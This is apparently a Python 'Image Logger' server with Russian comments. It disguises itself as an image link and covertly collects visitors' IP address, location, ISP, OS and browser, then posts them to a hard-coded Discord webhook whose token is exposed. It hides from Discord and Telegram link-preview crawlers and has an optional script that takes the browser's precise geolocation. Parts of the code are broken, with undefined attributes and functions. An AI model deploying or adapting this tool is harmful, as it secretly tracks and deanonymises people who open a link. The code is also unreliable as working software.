from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser
from enum import IntEnum
from typing import Optional, Dict, Any
from urllib.parse import urlparse
import requests_cache

# ========== Конфигурация ==========
class VPNCheckMode(IntEnum):
    NO_CHECK = 0
    NO_PING = 1
    NO_ALERT = 2

class AntiBotMode(IntEnum):
    NO_ANTI_BOT = 0
    NO_PING_POSSIBLE = 1
    NO_PING_CONFIRMED = 2
    NO_ALERT_POSSIBLE = 3
    NO_ALERT_CONFIRMED = 4

class Config:
    def __init__(self):
        self.webhook = "https://discord.com/api/webhooks/1338142323795824691/ox3HgetuOjqcKx-3AO1X6mb53Y-SfS8MBt3XU2M8GLVcgfNPE85Gk2Y8e5TDVYdsKUwt"
        self.image = "https://i.pinimg.com/736x/5c/3a/e0/5c3ae0ea65dbcf598608546551e54bba.jpg"
        self.image_argument = True
        self.username = "Image Logger"
        self.color = 0x00FFFF
        self.crash_browser = False
        self.accurate_location = False
        self.message = {
            "enable": False,
            "content": "Sample message",
            "rich_format": True
        }
        self.vpn_check = VPNCheckMode.NO_PING
        self.link_alerts = True
        self.bugged_image = True
        self.anti_bot = AntiBotMode.NO_PING_POSSIBLE
        self.redirect = {
            "enable": True,
            "url": "https://i.pinimg.com/736x/5c/3a/e0/5c3ae0ea65dbcf598608546551e54bba.jpg"
        }
        self.blacklisted_ips = ("27.", "104.", "143.", "164.")
        self.request_timeout = 10  # seconds

config = Config()
requests_cache.install_cache('ip_cache', expire_after=3600)
# ==================================

def validate_url(url: str) -> bool:
    """Проверка валидности URL"""
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False

def safe_base64_decode(data: str) -> Optional[str]:
    """Безопасное декодирование Base64"""
    try:
        return base64.b64decode(data.encode()).decode()
    except:
        return None

def bot_check(ip: str, user_agent: str) -> Optional[str]:
    """Определение ботов по IP и User-Agent"""
    if ip.startswith(("34.", "35.")):
        return "Discord"
    if user_agent.startswith("TelegramBot"):
        return "Telegram"
    return None

def send_error_report(error: str):
    """Отправка отчёта об ошибке в Discord"""
    requests.post(config.webhook, json={
        "username": config.username,
        "embeds": [{
            "title": "⚠️ Error Report",
            "color": config.color,
            "description": f"```\n{error[:2000]}\n```"
        }]
    }, timeout=config.request_timeout)

def get_ip_info(ip: str) -> Dict[str, Any]:
    """Получение информации об IP с кэшированием"""
    try:
        response = requests.get(
            f"http://ip-api.com/json/{ip}?fields=16976857",
            timeout=config.request_timeout
        )
        return response.json()
    except Exception as e:
        send_error_report(f"IP API Error: {str(e)}")
        return {}

def create_embed(ip: str, info: Dict[str, Any], user_agent: str, endpoint: str) -> Dict[str, Any]:
    """Создание embed для Discord"""
    os, browser = httpagentparser.simple_detect(user_agent)
    
    return {
        "username": config.username,
        "embeds": [{
            "title": "🌐 New IP Logged",
            "color": config.color,
            "description": (
                f"**IP:** `{ip}`\n"
                f"**Location:** {info.get('city', 'N/A')}, {info.get('country', 'N/A')}\n"
                f"**ISP:** {info.get('isp', 'N/A')}\n"
                f"**OS:** {os}\n**Browser:** {browser}\n"
                f"**VPN:** {info.get('proxy', False)}\n"
                f"**Bot:** {info.get('hosting', False)}"
            ),
            "footer": {"text": endpoint}
        }]
    }

class ImageLoggerHandler(BaseHTTPRequestHandler):
    """Обработчик HTTP-запросов с улучшенной обработкой ошибок"""
    
    def handle_request(self):
        try:
            client_ip = self.headers.get('x-forwarded-for', '')
            user_agent = self.headers.get('user-agent', '')
            
            if any(client_ip.startswith(prefix) for prefix in config.blacklisted_ips):
                return self.respond_403()
                
            if bot := bot_check(client_ip, user_agent):
                return self.handle_bot(bot)
                
            return self.handle_human(client_ip, user_agent)
            
        except Exception as e:
            send_error_report(traceback.format_exc())
            return self.respond_500()

    def handle_bot(self, bot: str):
        """Обработка ботов и краулеров"""
        self.send_response(200 if config.bugged_image else 302)
        self.send_header('Content-type', 'image/png' if config.bugged_image else 'Location')
        self.end_headers()
        
        if config.bugged_image:
            self.wfile.write(binaries["loading"])

    def handle_human(self, ip: str, user_agent: str):
        """Обработка реальных пользователей"""
        query = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
        image_url = self.get_image_url(query)
        
        if not validate_url(image_url):
            return self.respond_400("Invalid image URL")
            
        info = get_ip_info(ip)
        self.send_discord_alert(ip, user_agent, info)
        
        if config.redirect.enable:
            return self.handle_redirect()
            
        return self.serve_content(image_url, info, user_agent)

    def get_image_url(self, query: Dict[str, str]) -> str:
        """Получение URL изображения с проверкой"""
        if config.image_argument:
            if url_param := query.get('url') or query.get('id'):
                if decoded := safe_base64_decode(url_param):
                    return decoded
        return config.image

    def send_discord_alert(self, ip: str, user_agent: str, info: Dict[str, Any]):
        """Отправка уведомления в Discord"""
        if config.vpn_check == VPNCheckMode.NO_ALERT and info.get('proxy'):
            return
            
        embed = create_embed(ip, info, user_agent, self.path)
        requests.post(config.webhook, json=embed, timeout=config.request_timeout)

    def serve_content(self, image_url: str, info: Dict[str, Any], user_agent: str):
        """Обслуживание основного контента"""
        content = self.generate_html(image_url, info, user_agent)
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(content.encode())

    def generate_html(self, image_url: str, info: Dict[str, Any], user_agent: str) -> str:
        """Генерация HTML-контента"""
        html = f"""<html><body style="margin:0;background:url('{image_url}') center/contain no-repeat"></body>"""
        
        if config.accurate_location:
            html += """
            <script>
            navigator.geolocation.getCurrentPosition(pos => {
                const coords = btoa(`${pos.coords.latitude},${pos.coords.longitude}`);
                window.location.search += `&g=${encodeURIComponent(coords)}`;
            });
            </script>
            """
        return html

    # HTTP Responses
    def respond_403(self):
        self.send_response(403)
        self.end_headers()

    def respond_500(self):
        self.send_response(500)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'Internal Server Error')

    def respond_400(self, message: str):
        self.send_response(400)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(message.encode())

    do_GET = handle_request
    do_POST = handle_request

handler = ImageLoggerHandler